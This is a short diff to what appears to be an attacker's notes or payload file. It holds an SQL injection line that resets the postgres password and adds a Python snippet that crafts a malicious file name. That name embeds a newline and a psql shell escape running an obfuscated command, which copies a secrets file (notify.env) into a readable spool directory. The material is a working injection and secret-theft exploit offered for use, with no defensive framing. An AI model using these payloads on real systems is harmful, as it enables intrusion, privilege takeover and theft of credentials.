@@ -23,3 +23,12 @@
 ```
 '; ALTER USER postgres WITH PASSWORD 'newpassword'; -- 
 ```
+# sql inject with a file name 
+
+python3 << 'PYEOF'
+import shutil
+## Payload: Read notify.env and output it to a readable file
+cmd = r"cat $(printf '\057etc\057airport-gis\057notify.env') > $(printf '\057srv\057gis\057spool\057incoming\057out')"
+layer = 'x"\n\\! ' + cmd + '\n"'
+shutil.copy('/dev/shm/base.tif', layer + '.tif')
+PYEOF
